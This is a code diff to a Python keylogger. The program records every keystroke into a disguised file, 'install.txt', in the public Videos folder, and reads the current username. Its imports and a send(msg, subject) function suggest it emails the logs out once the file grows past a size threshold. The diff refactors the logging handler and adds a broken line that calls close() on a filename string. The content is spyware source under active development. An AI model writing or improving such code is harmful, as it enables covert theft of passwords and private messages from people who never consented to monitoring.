@@ -4,6 +4,11 @@ import smtplib, os, time, getpass
 from config import *
 
 file ="C:/Users/Public/Videos/install.txt"
+
+if not os.path.isfile(file):
+    f = open(file, 'w')
+    file.close()
+
 last_time = 0
 username = getpass.getuser()
 file_info = os.stat(file)
@@ -26,21 +31,20 @@ def send(msg, subject):
 
 def on_press(key):
     global last_time
+
+    f = open(file, 'a')
     if time.time() - last_time > 1:
-        f = open(file, 'a')
         f.write(' \n')
-        f.close()
     try:
-        f = open(file, 'a')
-        f.write(key.char + '\n')
-        f.close()
-        
+        f.write(key.char + '\n')        
     except AttributeError:
         if key == keyboard.Key.space:
-            f = open(file, 'a')
             f.write('space\n')
-            f.close()
-            
+    except TypeError:
+        pass
+
+    f.close()
+
     last_time = time.time()
 
 if(file_size > 50):
